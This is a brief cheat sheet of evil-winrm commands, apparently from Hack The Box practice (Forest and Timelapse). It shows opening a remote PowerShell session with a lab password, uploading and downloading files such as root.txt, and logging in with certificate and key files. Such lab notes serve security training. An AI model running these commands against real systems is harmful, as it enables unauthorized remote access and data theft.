## establish a session
```console
kali@kali:~$ evil-winrm -i 10.10.10.161 -u svc-alfresco' -p 's3rvice'
```
## upload and download file
```cmd
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kimkhuongduy/Desktop/file.file C:\Users\svc-alfresco\Documents
*Evil-WinRM* PS C:\Users\Administrator\Documents> download C:\Users\svc-alfresco\Documents\root.txt
```
## login with **.crt** and **.key** files from **.pfx** file
*Timelapse - hackthebox*
```console
#-c option acts as a public key and -k a private key
kali@kali:~$ evil-winrm -i 10.10.11.152 -S -c crt.crt -k key.key -u -p
```
